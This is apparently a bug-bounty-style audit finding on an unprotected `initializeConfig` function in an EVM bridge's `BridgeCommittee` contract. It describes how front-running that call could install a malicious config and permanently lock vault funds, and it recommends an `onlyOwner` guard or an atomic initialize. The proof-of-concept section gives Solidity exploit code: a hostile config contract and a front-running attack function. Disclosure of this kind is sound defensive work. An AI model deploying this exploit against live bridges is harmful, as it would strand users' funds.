### Title
Unprotected `initializeConfig` Allows Front-Running to Permanently Brick the Bridge — (`File: bridge/evm/contracts/BridgeCommittee.sol`)

---

### Summary

`BridgeCommittee.initializeConfig` has no access control and can be called by any address while `config == address(0)`. Because `initialize()` (which sets committee members) and `initializeConfig()` (which sets the `IBridgeConfig` pointer) are necessarily separate transactions in production, an attacker can front-run the second call and permanently install a malicious config, locking all vault funds.

---

### Finding Description

`CommitteeUpgradeable` correctly calls `_disableInitializers()` in its constructor, protecting every inheriting implementation contract from having its `initialize()` replayed. However, `initializeConfig` is a completely separate function that uses only a one-time custom guard:

```solidity
// bridge/evm/contracts/BridgeCommittee.sol  L63-66
function initializeConfig(address _config) external {
    require(address(config) == address(0), "BridgeCommittee: Config already initialized");
    config = IBridgeConfig(_config);
}
```

`_disableInitializers()` only blocks functions decorated with OpenZeppelin's `initializer` / `reinitializer` modifiers. `initializeConfig` carries neither modifier, so it is callable by any EOA or contract at any time the proxy's `config` slot is zero.

The deployment sequence (visible in `CommitteeUpgradeableTest.t.sol` and the production deployment scripts) is:

1. Deploy `BridgeCommittee` proxy → `initialize(committee, stake, minStake)` — sets `committeeStake` / `committeeIndex`; `config` remains `address(0)`.
2. Deploy `BridgeConfig` proxy → `initialize(...)`.
3. **Separate transaction**: `committee.initializeConfig(_config)`.

Between steps 1 and 3 there is an open window. A mempool observer can submit a higher-gas call to `committee.initializeConfig(maliciousConfig)` and win the race.

---

### Impact Explanation

Every downstream bridge operation reads `committee.config()`:

- `SuiBridge.transferBridgedTokensWithSignatures` — uses `config.tokenAddressOf`, `config.chainID`, `config.tokenSuiDecimalOf` to route vault withdrawals.
- `SuiBridge.bridgeERC20` / `bridgeETH` — uses `config.isTokenSupported`, `config.tokenAddressOf`.
- `BridgeLimiter.initialize` — calls `committee.config().isChainSupported` during its own init.

A malicious `IBridgeConfig` that returns `address(0)` for all token addresses causes every `_transferTokensFromVault` call to revert with "SuiBridge: Unsupported token", permanently locking all ETH and ERC-20 tokens held in `BridgeVault`. There is no `updateConfig` function; the only recovery path is a committee-signed UUPS upgrade, which itself requires the bridge to be partially functional.

**Impact class**: Permanent fund lock (High/Medium per the allowed impact gate).

---

### Likelihood Explanation

- Ethereum is a public mempool; front-running is a well-understood and routinely executed attack.
- The attacker needs no special privilege — any ordinary address can call `initializeConfig`.
- The window exists in every production deployment because the two calls cannot be atomic (they involve two different proxy contracts).
- The attacker's only cost is gas.

---

### Recommendation

Add an `onlyOwner` (or equivalent deployer-controlled) guard to `initializeConfig`, or fold the config assignment into `initialize` itself so both are executed atomically in the proxy deployment transaction:

```solidity
// Option A: restrict to deployer / owner
function initializeConfig(address _config) external onlyOwner {
    require(address(config) == address(0), "BridgeCommittee: Config already initialized");
    config = IBridgeConfig(_config);
}

// Option B: pass _config directly into initialize()
function initialize(
    address[] memory committee,
    uint16[] memory stake,
    uint16 minStakeRequired,
    address _config          // <-- add this
) external initializer {
    ...
    config = IBridgeConfig(_config);
}
```

### Proof of Concept

```solidity
// Attacker contract
contract MaliciousConfig is IBridgeConfig {
    // Returns address(0) for every token → all vault transfers revert
    function tokenAddressOf(uint8) external pure returns (address) { return address(0); }
    function isTokenSupported(uint8) external pure returns (bool)   { return false; }
    function isChainSupported(uint8) external pure returns (bool)   { return false; }
    function chainID() external pure returns (uint8)                { return 0; }
    function tokenSuiDecimalOf(uint8) external pure returns (uint8) { return 0; }
    function tokenPriceOf(uint8) external pure returns (uint64)     { return 0; }
}

// Attack sequence (Foundry pseudocode)
function attack(address committeeProxy) external {
    // Called in the same block as the deployer's initializeConfig tx,
    // but with higher gas price to win the race.
    MaliciousConfig mc = new MaliciousConfig();
    BridgeCommittee(committeeProxy).initializeConfig(address(mc));
    // config is now permanently set to mc; vault funds are locked.
}
```

After this call succeeds, `BridgeCommittee(committeeProxy).config()` returns `address(mc)`. Every subsequent call to `SuiBridge.transferBridgedTokensWithSignatures` or `bridgeERC20` reverts, and all tokens held in `BridgeVault` are permanently inaccessible.
